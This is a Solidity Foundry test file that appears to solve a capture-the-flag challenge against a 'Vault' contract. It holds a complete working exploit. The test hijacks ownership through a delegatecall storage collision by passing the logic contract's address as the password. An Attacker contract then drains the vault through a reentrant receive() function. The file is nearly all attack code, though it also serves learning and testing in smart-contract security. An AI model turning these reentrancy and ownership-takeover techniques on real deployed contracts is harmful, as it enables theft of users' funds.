// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/Vault.sol";




contract VaultExploiter is Test {
    Vault public vault;
    VaultLogic public logic;

    address owner = address (1);
    address palyer = address (2);

    function setUp() public {
        vm.deal(owner, 1 ether);

        vm.startPrank(owner);
        logic = new VaultLogic(bytes32("0x1234"));
        vault = new Vault(address(logic));

        vault.deposite{value: 0.1 ether}();
        vm.stopPrank();

    }

    function testExploit() public {
        vm.deal(palyer, 1 ether);
        vm.startPrank(palyer);

        // add your hacker code.
        Attacker attacker =  new Attacker(address(vault));
        bytes32 data = bytes32(uint256(uint160(address(logic))));
        bytes memory callData = abi.encodeWithSignature("changeOwner(bytes32,address)", data, address(attacker));
        address(vault).call(callData);
        attacker.openWithdraw();
        attacker.deposite{value: 0.1 ether}();
        attacker.withdraw();
        attacker.transferToOwner();
        uint256 balanceOfPalyer = palyer.balance;
        console.log(balanceOfPalyer);
        require(vault.isSolve(), "solved");
        vm.stopPrank();
    }

}

// New contract used to attack the contract {Vault}
contract Attacker {
    address public vaultAddr;
    address private owner;

    constructor(address _vaultAddr) {
        vaultAddr = _vaultAddr;
        owner = msg.sender;
    }

    function deposite() public payable {
        vaultAddr.call{value: msg.value}(abi.encodeWithSignature("deposite()"));
    }

    function openWithdraw() public {
        vaultAddr.call(abi.encodeWithSignature("openWithdraw()"));
    }

    function withdraw() public {
        vaultAddr.call(abi.encodeWithSignature("withdraw()"));
    }

    function transferToOwner() public {
        uint256 amount = address(this).balance;
        payable(owner).call{value: amount}("");
    }

    receive() external payable {
        if (vaultAddr.balance > 0) {
            withdraw();
        }
    }
}